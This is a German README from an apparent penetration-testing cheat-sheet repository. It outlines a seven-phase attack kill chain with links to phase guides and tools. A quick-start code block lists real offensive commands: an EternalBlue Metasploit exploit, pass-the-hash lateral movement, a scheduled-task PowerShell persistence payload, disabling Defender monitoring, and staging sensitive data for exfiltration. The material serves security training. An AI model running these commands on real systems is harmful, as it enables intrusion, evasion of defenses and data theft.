# 🎯 Angriffsmethodik – Kill Chain

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Was ist die Attack Kill Chain?

Die **Attack Kill Chain** (im Original auch als **Cyber Kill Chain** oder **MITRE ATT&CK** bezeichnet) beschreibt die Phasen, die ein Angreifer beim Kompromittieren und Ausnutzen eines Zielsystems oder Netzwerks durchläuft.

---

## 📊 Phasen der Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Anleitungen zu den Phasen

| Phase | Beschreibung | Anleitung |
|-------|-------------|-------|
| **1. Erstzugang (Initial Access)** | Erster Zugang zum Ziel | [📄 Ansehen](./01-Initial-Access.de.md) |
| **2. Erkundung/Enumeration** | Informationen über das kompromittierte System sammeln | [📄 Ansehen](./02-Enumeration.de.md) |
| **3. Rechteausweitung (Privilege Escalation)** | Rechte auf Administrator/root erweitern | [📄 Ansehen](./03-Privilege-Escalation.de.md) |
| **4. Laterale Bewegung (Lateral Movement)** | Über das Netzwerk auf weitere Systeme zugreifen | [📄 Ansehen](./04-Lateral-Movement.de.md) |
| **5. Persistenz (Zugang aufrechterhalten)** | Zugang nach Neustarts oder Erkennung aufrechterhalten | [📄 Ansehen](./05-Persistence.de.md) |
| **6. Umgehung von Schutzmaßnahmen (Defense Evasion)** | AV, EDR und Sicherheitskontrollen umgehen | [📄 Ansehen](./06-Defense-Evasion.de.md) |
| **7. Umsetzung der Angriffsziele** | Abschließendes Ziel erreichen (Exfiltration, Auswirkungen) | [📄 Ansehen](./07-Actions-Objectives.de.md) |

---

## 🔗 Weiterführende Cheatsheets

### Nach Phase

| Phase | Zugehörige Werkzeuge |
|-------|---------------|
| Erstzugang (Initial Access) | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Enumeration | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Rechteausweitung (Privilege Escalation) | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Laterale Bewegung (Lateral Movement) | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Persistenz (Zugang aufrechterhalten) | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Umgehung von Schutzmaßnahmen (Defense Evasion) | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Datenexfiltration | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 Schnelleinstieg

### Typischer Angriffsablauf
```bash
# 1. Erstzugang – Eine Schwachstelle ausnutzen
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Enumeration – Ermitteln, worauf Zugriff besteht
whoami /all
systeminfo
net user

# 3. Rechteausweitung – SYSTEM/root erlangen
.\winPEAS.exe

# 4. Laterale Bewegung – Auf weitere Systeme zugreifen
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistenz – Zugang aufrechterhalten
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Umgehung von Schutzmaßnahmen – AV deaktivieren
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Zielumsetzung – Daten exfiltrieren
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Ressourcen

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Der Kill Chain folgen!</b><br>
  <i>Nur für autorisierte Penetrationstests!</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Begriffsklärung:** Cyber Kill Chain und MITRE ATT&CK sind unterschiedliche Modelle. Diese sieben Phasen sind eine didaktische Zusammenstellung dieses Repositories, keine offizielle ATT&CK-Phasenfolge. ATT&CK beschreibt Taktiken und Techniken; Taktiken stehen für die Ziele eines Angreifers. [MITRE: Taktiken](https://attack.mitre.org/tactics/enterprise/)

> **Technische Begriffe:** Ein *Exploit* nutzt eine Schwachstelle aus; eine *Payload* ist der anschließend ausgeführte Code. *Enumeration* bedeutet das systematische Ermitteln von Informationen. *Pivoting* nutzt ein bereits erreichbares System als Zwischenstation. *AV* bezeichnet Antivirensoftware, *EDR* die Erkennung und Reaktion auf Endgeräten und *AMSI* die Antimalware Scan Interface.
